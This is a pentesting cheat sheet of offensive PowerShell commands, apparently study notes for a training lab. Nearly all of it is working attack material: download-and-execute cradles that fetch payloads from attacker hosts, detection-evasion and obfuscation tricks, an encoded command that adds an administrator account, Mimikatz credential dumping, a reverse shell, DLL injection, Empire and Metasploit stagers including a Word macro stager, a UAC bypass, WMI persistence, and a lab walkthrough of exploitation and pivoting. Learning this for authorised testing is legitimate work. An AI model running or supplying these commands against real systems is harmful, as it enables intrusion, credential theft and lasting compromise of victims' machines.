# Powershell For Pentesting


## PowerShell Fundamentals

```
# PowerSploit
https://github.com/PowerShellMafia/PowerSploit 

Invoke-AllChecks
Invoke-PrivescAudit

Invoke-ServiceAbuse -Name <service_name>

```

**PowerShell CLI**
```
# Executable Folders
C:\Windows\System32\WindowsPowerShell        # 64 Bit OS
C:\Windows\SysWOW64\WindowsPowerShell        # 32 Bit OS

# PS History file
%AppData%\Microsoft\Windows\PowerShell\PSReadLine

# Check if PS Process is running as 64 Bit
PS > [environment]::Is64BitOperatingSystem

# PS Help menu
PS > powershell /?

# ExecutionPolicy Bypass
PS > Get-ExecutionPolicy
PS > Set-ExecutionPolicy Bypass -Scope Process

C:\> powershell -ExecutionPolicy Bypass .\script.ps1
C:\> powershell -ExecutionPolicy Unrestricted .\script.ps1


# Hides PS Window
C:\> powershell -WindowStyle Hidden .\script.ps1


# Specify Command or Script Block
C:\> powershell -Command [Command or Script Block]
C:\> powershell -Command Invoke-Command -ScriptBlock { Get-Process }
C:\> powershell -Command Invoke-Command -ScriptBlock { Get-EventLog -LogName security }"

PS > Invoke-Command -ScriptBlock { param($p1, $p2)
    "p1: $p1"
    "p2: $p2"
    } -ArgumentList "First", "Second"


# Execute Base64 encoded script
PS > $string = {Get-Process}
PS > $encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
PS > powershell.exe -EncodedCommand $encodedcommand


# Execute Script with NoProfile Parameter
C:\ > powershell -NoProfile .\script.ps1


# Downgrade PS Version to 2
C:\ > powershell -Version 2


# Abbreviated above commands

powershell.exe -ep Bypass         # ExecutionPolicy Bypass
powershell.exe -ex by             # ExecutionPolicy Bypass

powershell.exe –enco              # EncodedCommand
powershell.exe –ec                # EncodedCommand

powershell.exe –W h               # WindowStyle Hidden
powershell.exe –Wi hi             # WindowStyle Hidden



# Get-Help - Obtain Information
PS > Get-Help Get-Help
PS > Get-Help Get-Process -Full
PS > Get-Help Get-Process -Examples
PS > Get-Help Get-Process -Online
PS > Get-Update


# List all Cmdlets, Alliases, Functions, Workflows, Filters, Scripts
PS > Get-Command 
PS > Get-Command -Name *Firewall*

```

**Cmdlets**
```
# List all Properties of Cmdlets
PS > Get-Process | Format-List *
PS > Get-Process | Select-Object -Property *

# Pipeline 
PS > Get-Process | Select-Object -Property Processname
PS > Get-Process | Select-Object -First 10
PS > Get-Process | Sort-Object -Unique 
PS > Get-Process | Sort-Object -Unique | Select-Object -First 10

# List All Aliases
PS > Get-Alias
PS > Get-Alias -Definiton -Get-Process 

# WMI Objects - Operating System
PS > Get-WmiObject -Class win32_operatingsystem  | Select-Object -Property 

# WMI Objects - Services
PS > Get-WmiObject -Class win32_service  | fl *
PS > Get-WmiObject -Class win32_service  | Sort-Object -Unique PathName | fl PathName

# List all Services
PS > Get-Service | Sort-Object Status -Descenting

# Export-CSV
PS > Get-Process | Export-Csv C:\Process.csv

# Exploring Windows Registry
PS > cd HKLM:\
PS > cd .\SOFTWARE\Microsoft\Windows\CurrentVersion

# Find *.txt files in Directory with Pattern - pass*
PS > Select-String -Path C:\Directory\*.txt -Pattern pass*

# Find with Recursively - Root Directory - C:\ | Pattern - pass* | File Extension - *.txt
PS > ls -r C:\ -File *.txt | % {Select-String -Path $_ -Pattern pass*}

```

**Modules**
```
# List of Imported Modules
PS > Get-Module
PS > Get-Module -ListAvailable

# Import Module
PS > Import-Module .\script.psm1

# PowerSploit
https://github.com/PowerShellMafia/PowerSploit

PS > Improt-Module PowerSploit             # Import Module
PS > Get-Module                            # Check
PS > Get-Command -Module Powersploit # List All Available Commands of PowerSplloit


PS > Get-Help Invoke-PrivescAudit       # Help on cmdlet
PS > Get-Help Wrtie-HijackDll           # Help on cmdlet


```

[Writing a Windows PowerShell Module
](https://learn.microsoft.com/en-us/powershell/scripting/developer/module/writing-a-windows-powershell-module?view=powershell-7.3&viewFallbackFrom=powershell-7)


**Scripts**
```
# List Files
PS > $file = "script.txt"
PS > Get-Content $file

# Foreach Loop
PS > $services = Get-Service
PS > ForEach-Object ($service in $services) { $service.Name }

PS > Get-Service | Foreach-Object {$__.Name}
PS > Get-Service | % {$__.Name}

# Where Object
PS >  Get-Service | Where-Object { $_.Status -match "Running"}
```


**Script which takes an Argument and list files**
```PowerShell
 Param(
    [Parameter(mandatory=$true)][string]$file
)
Get-Content "$file"
```


**Port-Scanner.ps1**
```Powershell
$ports=(81,444)
$ip="192.168.13.250"

foreach ($port in $ports) {try{$socket=New-Object System.Net.Sockets.TcpClient($ip,$port);}

catch{}; 

if ($socket -eq $null) {echo $ip":"$port" - Closed";}else{echo $ip":"$port" -
Open"; $socket = $null;}}
```


**Objects**
```
# List all available methods
PS > Get-Process | Get-Member -MemberType Method
PS > Get-Process firefox | Get-Member -MemberType Method

# Kill Process
PS > Get-Process -Name firefox | Kill


# Create New Object to Download file
PS C:\> $webclient = New-Object System.Net.WebClient
PS C:\> $payload_url = "https://attacker_host/payload.exe"
PS C:\> $file = “C:\ProgramData\payload.exe"
PS C:\> $webclient.DownloadFile($payload_url,$file)
```


## Offensive PowerShell


#### **Download and Execution**

```
# Download And Execution In Memory. - Net.WebClient
PS > iex (New-Object Net.Webclient).DownloadString(“http://attacker_url/script.ps1")

C:\> powershell.exe iex (New-Object Net.Webclient).DownloadString(‘http://attacker_url/script.ps1’)

-----------------------------------------------------------------------------

# Download file on Disk. - Net.WebClient
PS > iex (New-Object Net.Webclient).DownloadFile(“http://attacker_url/script.ps1", "C:\programdata\payload.exe")

PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $payload = "http://attacker_URL/payload.exe"
PS C:\> $local_file = "C:\programdata\payload.exe"
PS C:\> $downloader.DownloadFile($payload,$local_file)

-----------------------------------------------------------------------------

# Use System Proxy and Default Credentials.  - Net.WebClient
PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $payload = http://attacker_URL/script.ps1
PS C:\> $cmd = $downloader.DownloadFile($payload)
PS C:\> $proxy = [Net.WebRequest]::GetSystemWebProxy()
PS C:\> $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
PS C:\> $downloader.Proxy = $proxy
PS C:\> iex $cmd

-----------------------------------------------------------------------------

# Download and Execute in memory   - Net.WebRequest
PS C:\> $req = [System.Net.WebRequest]::Create("http://attacker_URL/script.ps1")
PS C:\> $res = $req.GetResponse()
PS C:\> iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()

-----------------------------------------------------------------------------

# USe System Proxy and Default Credentials  - Net.WebRequest
PS C:\> $req = [System.Net.WebRequest]::Create("http://attacker_URL/script.ps1")
PS C:\> $res = $req.GetResponse()
PS C:\> $proxy = [Net.WebRequest::GetSystemWebProxy()
PS C:\> $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
PS C:\> $req.Proxy = $proxy
PS C:\> iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()

-----------------------------------------------------------------------------

# Download and Execute in memory  - System.Xml.XmlDocument

PS C:\> $xmldoc = New-Object System.Xml.XmlDocument
PS C:\> $xmldoc.Load("http://attacker_URL/file.xml")
PS C:\> iex $xmldoc.command.a.execute


file.xml :
<?xml version="1.0"?>
<command>
<a>
<execute>Get-Process</execute>
</a>
</command>

-----------------------------------------------------------------------------

# Com Objects for Download and Execution  - Msxml2.XMLHTTP
PS C:\> $downloader = New-Object –ComObject Msxml2.XMLHTTP
PS C:\> $downloader.open(“GET”, “http://attacker_URL/script.ps1”, $false)
PS C:\> $downloader.send()
PS C:\> iex $downloader.responseText

-----------------------------------------------------------------------------
# Com Objects for Download and Execution  - WinHttp.WinHttpRequest.5.1
PS C:\> $downloader = New-Object –ComObject WinHttp.WinHttpRequest.5.1
PS C:\> $downloader.open(“GET”, “http://attacker_URL/script.ps1”, $false)
PS C:\> $downloader.send()
PS C:\> iex $downloader.responseText

-----------------------------------------------------------------------------

# ExecutionPolicy Bypass and Hiddne Window
C:\> powershell.exe –ExecutionPolicy bypass –Window hidden .\downloader.ps1 

-----------------------------------------------------------------------------

# Automation Script
https://github.com/danielbohannon/Invoke-CradleCrafter

```


**Download Evasions**
```
# Hosted file, where SSL is presented

-----------------------------------------------------------------------------

# Use different Extensions. Script still executes
PS C:\> iex (New-Object Net.Webclient).DownloadString(“http://attacker_url/logo.gif")

-----------------------------------------------------------------------------

# Custom user-agent Header
PS C:\> $downloader = New-Object System.Net.WebClient
PS C:\> $downloader.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0;
Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146
Safari/537.36")
PS C:\> $payload = "http://192.168.13.62/Get-ProcessPaths.ps1"
PS C:\> $command = $downloader.DownloadString($payload)
PS C:\> iex $command

```


```
# In Memory
• Net.WebClient DownloadString
• Net.WebClient DownloadData
• Net.WebClient OpenRead 
• .NET [Net.HttpWebRequest] class
• Word.Application COM Object
• Excel.Application COM Object
• InternetExplorer.Application COM Object
• MsXml2.ServerXmlHttp Com Object
• Certutil.exe w/ -ping argument

# On Disk
• Net.WebClient DownloadFile method
• BITSAdmin.exe
• Certutil.exe w/ -urlcache argument
```


#### Obfuscation

```
#Invoke-Obfuscation
https://github.com/danielbohannon/Invoke-Obfuscation
PS > Import-Module .\Invoke-Obfuscation.psd1

# Invoke-Obfuscation Commands
Invoke-Obfuscation > show options
Invoke-Obfuscation > set ScriptBlock {ps1 script we want to obfuscate}
Invoke-Obfuscation > STRING        # STRING/AST/TOKEN/ECNODING/COMPRESS...
Invoke-Obfuscation > ENCODE     

Invoke-Obfuscation > RESET         # Dont Append Obfuscations Each Others
Invoke-Obfuscation > LAUNCHER      # Generate Launcher


# Base64 Encoding
PS > $command = ‘net user admin1 “p@ssw0rd9001” /ADD; net localgroup administrators admin1 /add’
PS > $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
PS > $encodedCommand = [Convert]::ToBase64String($bytes)
PS > $encodedCommand
PS > powershell.exe -encodedcommand $encodedCommand


```


#### Information Gathering And Recon

**Host Discovery**
```
# Powersploit - Invoke-PortScan
PS > Import-Module .\Powersploit.psd1
PS > Invoke-PortScan -Hosts "192.168.1.1/24" -PingOnly
PS > Invoke-PortScan -HostFile ips.txt -PingOnly
PS > Invoke-PortScan -HostFile ips.txt -PingOnly | Export-Csv C:\output.txt



```

**Ports Scan**
```
# PowerSploit - Invoke-PortScan
PS > Invoke-PortScan -HostFile live_hosts.txt -ports "53-81"

PS > Invoke-PortScan -HostFile live_hosts.txt -oG port_scan.gmap -f ports "1-81"

-----------------------------------------------------------------------------

# Posh-Secmod - Invoke-ARPScan
https://github.com/darkoperator/Posh-SecMod

PS > Import-Module .\Discovery.psm1
PS > Invoke-ARPScan -CIDR 192.168.1.1/24


```

**Reverse DNS Lookup**
```
# Posh-Secmod - Invoke-ReverseDnsLookup
https://github.com/darkoperator/Posh-SecMod

PS > Import-Module .\Discovery.psm1
PS > Invoke-ReverseDnsLookup -CIDR 192.168.1.1/24
```

**DNSRecord & HostRecord**
```
PS > Resolve-DNSRecord -Target microsoft.com  -Type NS
PS > Resolve-HostRecord -Target microsoft.com
```


**Directory Fuzzing**
```
# PowerSploit - Get-HttpStatus
PS > Get-HttpStatus -Target example.com -Path dictionary.txt -Port 80 | ? { $_Status -match "ok"}
```



#### Post Exploitation

**Nishang - Post Exploitation**
```
# Nishang Gather - Copy-VSS
PS > iex (New-Object Net.Webclient).DownloadString(“https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Copy-VSS.ps1"); Copy-VSS

# Nishang Gather - Get-Information
PS >  iex (New-Object Net.Webclient).DownloadString(“https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-Information.ps1"); Get-Information

# Nishang Gather - Get-PassHints
PS >  iex (New-Object Net.Webclient).DownloadString(“https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHints.ps1"); Get-PassHints

# Nishang Gather - Invoke-Mimikatz
PS >  iex (New-Object Net.Webclient).DownloadString(“https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -DumpCreds

-----------------------------------------------------------------------------

# Nishang Brute Force - MSSQL, Active Directory, WEB, FTP
PS > Invoke-BruteForce –ComputerName targetdomain.com –UserList C:\temp\users.txt –PasswordList C:\temp\pwds.txt –Service ActiveDirectory –StopOnSuccess -Verbose

-----------------------------------------------------------------------------

# Nishang Reverse PowerShell
$ nc -nvlp 4444
PS >  iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1"); Invoke-PowerShellTcp -Reverse -IPAddress <listener_IP> -Port 4444

-----------------------------------------------------------------------------


```


**PowerSploit - Post Exploitation**
```
# PowerUp - Privilege Escalation
PS >  Import-Module .\Privesc.psm1
PS >  Get-Command -Module Privesc
PS >  Invoke-AllChecks
PS >  Invoke-AllChecks - HTMLReport

-----------------------------------------------------------------------------

# PowerSploit - Invoke-DllInjection
$ msfvenom -p windows/exec CMD=“cmd.exe” -f dll > cmd.dll

PS C:\> iex (New-Object Net.Webclient).DownloadFile(‘http://attacker_URL/cmd.dll’,‘C:\programdata\cmd.dll’)

PS > iex (New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1"); Invoke-DLLInjection –ProcessID 7420 C:\programdata\cmd.dll


```


**psgetsystem** 
```
# https://github.com/decoder-it/psgetsystem

# Get NT\SYSTEM Privilege form Administrator
PS > .\psgetsys.ps1
PS > [MyProcess]::CreateProcessFromParent(system_pid,"command_to_execute")

# Get List of NT\SYSTEM process
PS >  Get-Process -IncludeUserName | ? {$_.username -match "SYSTEM"} | Select-Object -Property username,name,id
```


**Empire - Post Exploitation**
```
# https://github.com/EmpireProject/Empire

$ git clone https://github.com/EmpireProject/Empire
$ ./setup/install.sh

(Empire) > listeners
(Empire) > uselistener [TAB]
(Empire) > uselistener http
(Empire) > help

# Set up SSL listener
$ ./Empire/setup/cert.sh                  # Generate SSL keys
(Empire: listener/http) > set CertPath <Directory where SSL keys are>
(Empire: listener/http) > execute

(Empire: listener/http) > back
(Empire: listener) > listeners




# Create Stager Payload
(Empire: listener) > usestager [TAB]
(Empire: listener) > usestager multi/launcher
(Empire: listener/multi/launcher) > info                 # list of options
(Empire: listener/multi/launcher) > set listener http    # Generated listener
(Empire: listener/multi/launcher) > execute              # Generate Payload

(Empire: listener/multi/launcher) > agents         # List active sessions



# Agents - Sessions
(Empire: agents) > help
(Empire: agents) > interact [TAB]                  # Interact with session
(Empire: Interact) > help                          # List of Commands
(Empire: Interact) > info
(Empire: Interact) > shell whoami                  # Execute Command
(Empire: Interact) > usemodule [TAB]               # List all Modules
(Empire: Interact) > searchmodule checks           # Search Modules

(Empire: Interact) > usemodule privesc/powerup/allchecks
(Empire: powershell/privesc/powerup/allchecks) > execute



# Client-Side Attack - Use Macro

(Empire: powershell/privesc/powerup/allchecks) > main
(Empire) > usestager windows/macro
(Empire: stager/windows/macro) > set listener http           
(Empire: stager/windows/macro) > set OutFile <Directory>
(Empire: stager/windows/macro) > execute

# Open Microsoft Word with developer permission. Enter the Visual Basic Editor with ALT+F11 and paste generate macro code into it. 



```





---------------------------------------------


```
# Generate Msfvenom Payload and initiate connection from remote machine

msf > use exploit/multi/handler
msf > set payload windows/x64/meterpreter/reverse_https

$ Msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -f psh-reflection > payload.ps1

C:\> powershell.exe iex (New-Object Net.Webclient).DownloadString(‘http://attacker_url/payload.ps1’)


-----------------------------------------------------------------------------

# Powershell Module on Meterpreter

meterpreter > load powershell
meterpreter > powershell_shell
meterpreter > powershell_execute 'Get-Process'


-----------------------------------------------------------------------------


# Pass an existing active agent Empire session over metasploit
msf > use exploit/multi/script/web_delivery
msf > set payload windows/meterpreter/reverse_https
msf > set target 2
msf > exploit

(Empire): usemodule powershell/code_execution/Invoke_metasploitpayload
(Empire): info
(Empire): set URL <MSFVenom Generated Payload>
(Empire): set Agent <Agent>
(Empire): execute



```


**UAC Bypass PowerShell Exploit Script**
```
Programs which can run to HIGH integrity without promting the UAC
1. msfconfig.exe
2. compmgmtlauncher.exe
3. dccw.exe


# Process Monitor Filters
Process Name.  > is       > mmc.exe
Process Name   > is       > compmgmtlauncher.exe
Result         > is       > NAME NOT FOUND
PATH           > contains > msc


# Search path on Process Monitor and modify regedit value of this to "C:\windows\system32\cmd.exe"

HKCU\Software\Classes\mscfile\shell\open\command



# Windows Runs
RUN > compmgmtlauncher.exe

```


**Introduction to Leveraging WMI and Methods for Persistence**
```
# Get Information About WMI instances, Classes and related information
PS > Get-WmiObject
PS > Get-Help Get-WmiObject
PS > Get-Help wmi

# List all Namespaces within the root/cimv2 namespace along its namespaces classes
PS > Get-WmiObject -Namespace root/cimv2 -Class "__NameSpace"
PS > Get-WmiObject -Namespace root/cimv2 -Class "__NameSpace" | Select-Object -Property Name

PS > Get-WmiObject -Namespace root/cimv2 -List
PS > Get-WmiObject -Namespace root/cimv2 -List | ? {$_.Name -Match "win32_service"}

# Get a specific service - win32_service
PS > Get-WmiObject -Class win32_service
PS > Get-WmiObject -Class win32_service | ? {$_.State -Match "Running"}
PS > Get-WmiObject -Class win32_service | ? {$_.Name -Match "Defend"}

# Get a specific service - win32_process
PS > Get-WmiObject -Class win32_process
PS > Get-WmiObject -Class win32_process -List


# Get Available methods of specifit Class
PS > Get-WmiObject -Class win32_process -List | Get-Member -MemberType Method
PS > Get-WmiObject -Class win32_service -List | Get-Member -MemberType Method



# Create Process - CMD.exe
PS > $proc = Get-WmiObject -List win32_process
PS > $proc.Create("cmd.exe")

PS >  Invoke-WmiMethod -Class win32_process -Name Create -ArgumentList cmd.exe


# Launching Processes on Remote Computers
PS > Invoke-WmiMethod -Class win32_process -Name Create -ArgumentList cmd.exe -ComputerName 192.168.100.8 -Credential gibarbakadze

# Check that Process is running on Remote Computer
PS > Get-WmiOnject -Class win32_process  -Filter (ProcessID= "<ProcessID>") -ComputerName 192.168.100.8 -Credential gibarbakadze

# Kill Process on Remote Computer
PS > Get-WmiOnject -Class win32_process  -Filter (ProcessID= "<ProcessID>") -ComputerName 192.168.100.8 -Credential gibarbakadze | Remove-WmiObject 
```


**WMI - PowerLunk - Persistence**
```
# https://github.com/Sw4mpf0x/PowerLurk

# Write the notepad.exe process ID to C:\temp\log.txt whenever notepad.exe starts. Also Possible to run MSFVenom Payload 

PS > iex (New-Object Net.Webclient).DownloadString(“https://raw.githubusercontent.com/Sw4mpf0x/PowerLurk/master/PowerLurk.ps1"); Register-MaliciousWmiEvent -EventName LogNotepad -PermanentCommand “cmd.exe /c echo %ProcessId% >> c:\\temp\\log.txt” -Trigger ProcessStart -ProcessName notepad.exe



# View Our Malicious WMI event
PS > iex (New-Object Net.Webclient).DownloadString(“https://raw.githubusercontent.com/Sw4mpf0x/PowerLurk/master/PowerLurk.ps1"); Get-WmiEvent -Name LogNotepad



# Remove Our Malicious WMI event
PS > iex (New-Object Net.Webclient).DownloadString(“https://raw.githubusercontent.com/Sw4mpf0x/PowerLurk/master/PowerLurk.ps1"); Get-WmiEvent -Name LogNotepad | Remove-WmiObject

```


**LAB -  Leveraging PowerShell During Exploitation**
```
# Scan Host
nmap -sS -sV -p- demo.ine.local

# Port 4983 is opened. Open with Firefox to View Administrator Credentials

# Impacket-Psexec 
$ Impacket-Psexec Administrator:'abc_123321!@#'@demo.ine.local
$ whoami


# Run Empire
$ powershell-empire server
$ powershell-empire client


# Empire Setup Listener
$ ./Empire/setup/cert.sh                  # Generate SSL keys
(Empire) > uselistener http
(Empire: listener/http) > set Host 10.10.10.15
(Empire: listener/http) > set Port 443
(Empire: listener/http) > set CertPath <Directory where SSL keys are>
(Empire: listener/http) > execute
(Empire: listener/http) > main


# Empire Setup Stager
(Empire) > usestager multi/launcher
(Empire: usestager/multi/launcher) > set Listener http
(Empire: usestager/multi/launcher) > execute


# Copy and paste the Empire-generated PowerShell code, to Impacket-Psexec

# Empire Agents - Bounch of various interesting modules

(Empire) > agents
(Empire: agents) > interact <agent>
(Empire: agents) > help

(Empire: Interact) > usemodule powershell/situational_awareness/network/port_scan

(Empire: Interact) > usemodule powershell/situational_awareness/host/computerdetails

(Empire: Interact) > usemodule powershell/privesc/powerup/allchecks



# Transfer our existing Empire Agent over to Metasploit
msf > use exploit/multi/script/web_delivery
msf > set target 2
msf > set SRVHOST 10.10.10.15
msf > set LHOST 10.10.10.15
msf > set Payload windows/meterpreter/reverse_tcp
msf > exploit

(Empire: Interact) > usemodule powershell/code_execution/invoke_metasploitpayload
(Empire: Interact) > set URL <Metasploit Generated URL>
(Empire: Interact) > execute


# Pivoting over Metasploit
Meterpreter > run autoroute -s <IP> -n <Subnet>
Meterpreter > backgrund
msf > use auxiliary/server/socks_proxy
msf > set srvversion 4a
msf > set srvport 9050
msf > execute
msf > jobs

$ proxychains nmap -sT -Pn -n --top-ports 50 fileserver.ine.local
$ proxychains firefox > http://fileserver.ine.local

# Exoloit port 80 on fileserver.ine.local
msf > exploit/windows/http/badblue_passthru
msf > set PAYLOAD windows/meterpreter/bind_tcp
msf > set RHOSTS fileserver.ine.local
msf > exploit
meterpterer > getsystem
meterpreter > cat C:\flag.txt

```
